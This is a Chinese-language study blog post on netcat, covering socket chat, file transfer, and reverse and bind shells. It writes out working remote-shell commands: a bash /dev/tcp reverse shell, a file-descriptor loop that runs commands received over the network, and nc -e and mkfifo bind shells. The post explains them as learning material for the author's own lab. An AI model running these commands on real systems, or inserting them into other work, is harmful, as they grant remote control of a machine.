---
title: NetCat
date: 2016-08-26 14:17:46
tags:
- network security
- shell
- pipe
categories:
- study
---

参考资料:
[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)
[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)
[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)

<!--more-->

---

# 1. nc能干啥？
能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件....  
netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在\*nix系统的shell中键入`man nc`查看手册．这里建议先好好学习一下Linux系统中管道(| > < >> <<等)的用法以及文件描述符的相关知识．

---
# 2. 栗子:
扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．
## 1. 聊天:
我先在终端用ssh连接到一台Linux主机，然后键入`nc -l 8888`在远程机器的本地进行监听，然后在本机再开一个终端键入`nc -n 10.128.54.118 8888`即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为"0.0.0.0",表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.
![nc_liaotian](/images/nc_liaotian.png)

## 2.监听和反弹shell(reverse shell)
先在一台主机shell环境中键入`nc -l -v -p 8888`,然后在另外一台主机中键入`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在\*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,`>`后面加上`&`表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流`>`重定向到了网络上，然后后面的`0>&1`表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.
![Reverse_shell](/images/nc_reverse_shell.png)
关于反弹shell的代码网络上有很多，比如[这里](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:
```bash
$exec 3<>/dev/tcp/10.128.54.118/8888#创建3号文件描述符绑定到一个读写的网络连接
$cat <&3 | while read line; do $line >&3 2>&1; done#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．
```


## 3. 连接监听的shell(bind shell)
在Server端：
```bash
$nc -l port -e /bin/bash -i
```
在Client端：
```bash
$nc server_ip port 
```
一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:
```bash
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo
```
![bind_shell](/images/nc_bind_shell.png)

## 4. 传送文件
说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．

Sender:
```bash
$nc -l Port < file
```

Receiver:
```bash
$nc IP Port > file
```
![file_send](/images/nc_file_send.png)
当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．

---

# 3. 总结
对于\*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下...
